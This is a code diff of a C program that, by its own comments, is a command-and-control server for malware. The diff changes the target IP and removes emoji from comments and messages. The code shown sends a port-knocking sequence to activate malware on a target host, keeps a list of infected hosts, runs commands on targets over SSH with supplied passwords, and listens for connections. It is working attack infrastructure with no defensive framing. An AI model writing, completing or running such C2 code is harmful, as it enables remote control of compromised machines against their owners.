@@ -4,7 +4,7 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 
-#define TARGET_IP "192.168.18.130"
+#define TARGET_IP "192.168.152.128"
 #define KNOCK_PORT_1 1111
 #define KNOCK_PORT_2 2222
 #define KNOCK_PORT_3 3333
@@ -21,7 +21,7 @@ typedef struct {
 InfectedHost infected_hosts[100];
 int infected_count = 0;
 
-// 🔥 Fonction pour envoyer le port knocking
+// Fonction pour envoyer le port knocking
 void knock(int port) {
     int sock;
     struct sockaddr_in server_addr;
@@ -43,27 +43,27 @@ void knock(int port) {
     close(sock);
 }
 
-// 🔥 Envoi des knocks au démarrage du C2
+// Envoi des knocks au démarrage du C2
 void send_knocks() {
-    printf("[C2] 🔓 Envoi initial de la séquence de port knocking...\n");
+    printf("[C2] Envoi initial de la séquence de port knocking...\n");
     knock(KNOCK_PORT_1);
     sleep(1);
     knock(KNOCK_PORT_2);
     sleep(1);
     knock(KNOCK_PORT_3);
     sleep(1);
-    printf("[C2] ✅ Knock terminé, le malware doit être activé sur la cible.\n");
+    printf("[C2] Knock terminé, le malware doit être activé sur la cible.\n");
 }
 
-// 🔥 Fonction pour exécuter des commandes sur la cible via SSH
+// Fonction pour exécuter des commandes sur la cible via SSH
 void execute_ssh_commands(char *ip, char *username, char *password) {
     char command[256];
-    printf("\n[C2] 🖥️ Connexion SSH établie avec %s@%s...\n", username, ip);
+    printf("\n[C2] Connexion SSH établie avec %s@%s...\n", username, ip);
     
     snprintf(command, sizeof(command), SSH_COMMAND, password, username, ip);
     FILE *fp = popen(command, "w");
     if (fp == NULL) {
-        printf("[C2] ❌ Impossible d'exécuter la commande SSH\n");
+        printf("[C2] Impossible d'exécuter la commande SSH\n");
         return;
     }
 
@@ -156,7 +156,7 @@ int main() {
         exit(1);
     }
 
-    printf("🔥 Serveur C2 en écoute sur le port %d...\n", C2_PORT);
+    printf("Serveur C2 en écoute sur le port %d...\n", C2_PORT);
 
     while (1) {
         addr_size = sizeof(client_addr);
